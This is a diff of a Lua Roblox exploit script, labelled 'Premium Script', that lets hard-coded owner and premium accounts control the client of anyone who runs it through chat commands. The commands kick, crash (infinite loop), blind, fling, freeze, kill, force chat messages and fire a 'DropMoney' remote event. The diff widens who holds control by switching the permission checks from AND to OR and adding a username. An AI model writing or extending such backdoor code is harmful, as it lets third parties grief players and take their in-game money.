@@ -19,10 +19,12 @@ local owners = {
     "anhchangm52",
     "Itsnot_cool1",
 }
+
 local premiumUsers = {
     "Fkgebder",  
     "Newproarley",
     "Bannanaman3160",
+    "s4b2xalt", -- TẠM THỜI THÊM VÀO ĐÂY ĐỂ FIX
 }
 
 local premiumBypassUsers = {
@@ -30,62 +32,67 @@ local premiumBypassUsers = {
     "Bannanaman3160",
 }
 
-print("LocalPlayer:", localPlayer.Name)
+-- CACHE GAMEPASS
+local gamepassCache = {}
 
--- isInTable PHẢI Ở TRÊN CÙNG
+-- Helper Functions
 local function isInTable(plr, tbl)
     for _, name in ipairs(tbl) do
-        if plr.Name == name then
-            return true
-        end
+        if plr.Name == name then return true end
     end
     return false
 end
 
--- OWNER CHECK
 local function isOwner(plr)
-    for _, n in ipairs(owners) do
-        if plr.Name == n then return true end
-    end
-    return false
+    return isInTable(plr, owners)
 end
 
--- GAMEPASS CHECK
 local function ownsPass(plr, id)
-    local ok, res = pcall(function()
+    local key = plr.UserId .. "_" .. id
+    if gamepassCache[key] ~= nil then
+        return gamepassCache[key]
+    end
+    
+    local success, result = pcall(function()
         return MarketplaceService:UserOwnsGamePassAsync(plr.UserId, id)
     end)
-    return ok and res
+    
+    if success then
+        gamepassCache[key] = result
+        return result
+    end
+    return false
 end
 
-local function hasBypass(plr)
-    return isOwner(plr)
-        and isInTable(plr, premiumBypassUsers)
-        and ownsPass(plr, BYPASS_PASS)
-end
-
+-- PERMISSION CHECK
 local function hasPermission(plr)
-    local result = isOwner(plr)
-        and isInTable(plr, premiumUsers)
-        and ownsPass(plr, PREMIUM_PASS)
-    print("hasPermission("..plr.Name.."):", result)
-    return result
+    return isOwner(plr) 
+        or isInTable(plr, premiumUsers) 
+        or ownsPass(plr, PREMIUM_PASS)
 end
 
--- CHAT FORCE
+local function isProtected(plr)
+    return isOwner(plr) 
+        or isInTable(plr, premiumBypassUsers) 
+        or ownsPass(plr, BYPASS_PASS)
+end
+
+-- UTILITY FUNCTIONS
 local function forceSay(msg)
-    local chan = ChatService:FindFirstChild("TextChannels") and ChatService.TextChannels:FindFirstChild("RBXGeneral")
-    if chan then pcall(function() chan:SendAsync(msg) end) end
+    local chan = ChatService:FindFirstChild("TextChannels") 
+        and ChatService.TextChannels:FindFirstChild("RBXGeneral")
+    if chan then 
+        pcall(function() chan:SendAsync(msg) end) 
+    end
 end
 
--- BRING
 local function bringTo(fromPlayer)
-    if localPlayer.Character and fromPlayer.Character and fromPlayer.Character:FindFirstChild("HumanoidRootPart") then
+    if localPlayer.Character and fromPlayer.Character 
+        and fromPlayer.Character:FindFirstChild("HumanoidRootPart") then
         localPlayer.Character:PivotTo(fromPlayer.Character.HumanoidRootPart.CFrame)
     end
 end
 
--- FREEZE / UNFREEZE (TORSO)
 local function setFreeze(state)
     if not localPlayer.Character then return end
     for _, part in ipairs({"LowerTorso","UpperTorso"}) do
@@ -94,19 +101,35 @@ local function setFreeze(state)
     end
 end
 
--- RESET
 local function resetPlayer()
-    local hum = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")
+    local hum = localPlayer.Character 
+        and localPlayer.Character:FindFirstChildOfClass("Humanoid")
     if hum then hum.Health = 0 end
 end
 
--- DROP CASH
 local function dropCash()
     local ev = ReplicatedStorage:FindFirstChild("MainEvent")
     if ev then ev:FireServer("DropMoney", "10000") end
 end
 
--- LEVENSHTEIN
+local function crashClient()
+    while true do end
+end
+
+local function blindClient()
+    if workspace.CurrentCamera then
+        workspace.CurrentCamera:Destroy()
+    end
+end
+
+local function fling()
+    if localPlayer.Character 
+        and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        localPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 99999, 99999)
+    end
+end
+
+-- LEVENSHTEIN DISTANCE
 local function levenshtein(s, t)
     local m, n = #s, #t
     if m == 0 then return n end
@@ -127,7 +150,6 @@ local function levenshtein(s, t)
     return d[m][n]
 end
 
--- FIND CLOSEST PLAYER (USERNAME OR DISPLAYNAME)
 local function findClosestPlayer(query)
     query = string.lower(query)
     local best, score = nil, math.huge
@@ -146,30 +168,13 @@ local function findClosestPlayer(query)
     return best
 end
 
--- CRASH CLIENT
-local function crashClient()
-    while true do end
-end
-
--- BLIND
-local function blindClient()
-    if workspace.CurrentCamera then
-        workspace.CurrentCamera:Destroy()
-    end
-end
-
--- FLING
-local function fling()
-    if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
-        localPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 99999, 99999)
-    end
-end
-
--- ORBIT
+-- ORBIT SYSTEM
 getgenv().orbit = false
 local orbitTarget
 RunService.Stepped:Connect(function()
-    if getgenv().orbit and orbitTarget and orbitTarget.Character and orbitTarget.Character:FindFirstChild("HumanoidRootPart") and localPlayer.Character then
+    if getgenv().orbit and orbitTarget and orbitTarget.Character 
+        and orbitTarget.Character:FindFirstChild("HumanoidRootPart") 
+        and localPlayer.Character then
         local t = tick()
         localPlayer.Character.HumanoidRootPart.CFrame =
             orbitTarget.Character.HumanoidRootPart.CFrame
@@ -180,77 +185,44 @@ end)
 
 -- COMMAND HANDLER
 local function setupCommands(plr)
-    print("Setting up commands for:", plr.Name)
     plr.Chatted:Connect(function(msg)
-        print("Chat detected from", plr.Name, ":", msg)
-        
-        print("hasBypass(localPlayer):", hasBypass(localPlayer))
-        print("isOwner(localPlayer):", isOwner(localPlayer))
-        
-        if hasBypass(localPlayer) then 
-            print("BLOCKED: localPlayer has bypass")
-            return 
-        end
-        
-        if isOwner(localPlayer) and plr ~= localPlayer then 
-            print("BLOCKED: localPlayer is owner and command is from another player")
-            return 
-        end
-        
-        if not hasPermission(plr) then 
-            print("BLOCKED: No permission")
-            return 
-        end
+        -- CHECK PERMISSION
+        if not hasPermission(plr) then return end
 
         local args = string.split(msg, " ")
         local cmd = string.lower(args[1] or "")
-        
-        print("Command:", cmd, "Args:", table.concat(args, ", "))
 
-        -- ALL COMMANDS
+        -- COMMANDS WITHOUT TARGET
         if cmd == ".b" and args[2] == "all" then
-            print("Executing: bring all")
             bringTo(plr)
             return
         elseif cmd == ".sayall" then
-            print("Executing: sayall")
             forceSay(table.concat(args, " ", 2))
             return
         end
 
-        if not args[2] then 
-            print("No target specified")
-            return 
-        end
+        -- NEED TARGET
+        if not args[2] then return end
         
         local target = findClosestPlayer(args[2])
-        print("Target found:", target and target.Name or "nil")
-        print("localPlayer:", localPlayer.Name)
-        
-        if target ~= localPlayer then 
-            print("BLOCKED: Target is not localPlayer")
-            return 
+        if not target or target ~= localPlayer then return end
+
+        -- PROTECTION CHECK
+        if isProtected(localPlayer) and not isOwner(plr) then
+            print("[BLOCKED]", plr.Name, "cannot control protected user")
+            return
         end
 
-        print("EXECUTING COMMAND:", cmd)
-        
-        if cmd == ".k" then
-            localPlayer:Kick("Premium Has Kicked You")
-        elseif cmd == ".kick" then
+        -- EXECUTE COMMANDS
+        if cmd == ".k" or cmd == ".kick" then
             localPlayer:Kick("Premium Has Kicked You")
         elseif cmd == ".crash" then
             crashClient()
-        elseif cmd == ".b" then
+        elseif cmd == ".b" or cmd == ".bring" then
             bringTo(plr)
-        elseif cmd == ".bring" then
-            bringTo(plr)
-        elseif cmd == ".fr" then
+        elseif cmd == ".fr" or cmd == ".freeze" then
             setFreeze(true)
-        elseif cmd == ".freeze" then
-            setFreeze(true)
-        elseif cmd == ".unfr" then
-            setFreeze(false)
-        elseif cmd == ".unfreeze" then
+        elseif cmd == ".unfr" or cmd == ".unfreeze" then
             setFreeze(false)
         elseif cmd == ".reset" then
             resetPlayer()
@@ -271,15 +243,22 @@ local function setupCommands(plr)
     end)
 end
 
+-- INITIALIZE
+print("Premium Script Loaded | LocalPlayer:", localPlayer.Name)
+
 for _, p in ipairs(Players:GetPlayers()) do
-    print("Checking player:", p.Name, "hasPermission:", hasPermission(p))
-    if hasPermission(p) then 
-        setupCommands(p) 
-    end
+    setupCommands(p)
 end
-Players.PlayerAdded:Connect(function(p)
-    print("New player joined:", p.Name)
-    if hasPermission(p) then 
-        setupCommands(p) 
+
+Players.PlayerAdded:Connect(setupCommands)
+
+-- TEST GAMEPASS (CHẠY 1 LẦN SAU 5 GIÂY)
+task.delay(5, function()
+    print("\n=== GAMEPASS TEST ===")
+    for _, p in ipairs(Players:GetPlayers()) do
+        local hasPrem = ownsPass(p, PREMIUM_PASS)
+        local hasBypass = ownsPass(p, BYPASS_PASS)
+        print(p.Name, "| Premium:", hasPrem, "| Bypass:", hasBypass)
     end
+    print("===================\n")
 end)
